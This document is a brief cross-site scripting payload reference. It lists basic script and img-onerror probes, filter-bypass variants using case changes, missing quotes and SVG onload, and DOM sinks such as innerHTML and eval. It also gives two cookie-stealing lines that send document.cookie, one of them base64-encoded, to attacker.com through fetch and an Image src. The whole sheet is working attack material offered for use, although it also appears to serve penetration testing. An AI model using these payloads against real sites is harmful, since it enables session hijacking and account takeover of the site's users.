# XSS Payload Reference

## Basic Probes
```html
<script>alert(1)</script>
"><script>alert(1)</script>
'><img src=x onerror=alert(1)>
javascript:alert(1)
```

## Filter Bypass
```html
<!-- Case variation -->
<ScRiPt>alert(1)</ScRiPt>

<!-- No quotes -->
<img src=x onerror=alert(1)>

<!-- SVG -->
<svg onload=alert(1)>
```

## Exfil Cookie
```javascript
fetch("https://attacker.com/?c="+document.cookie)
new Image().src="https://attacker.com/?c="+btoa(document.cookie)
```

## DOM-based Sinks to Check
```javascript
document.write()
innerHTML
eval()
location.href
```
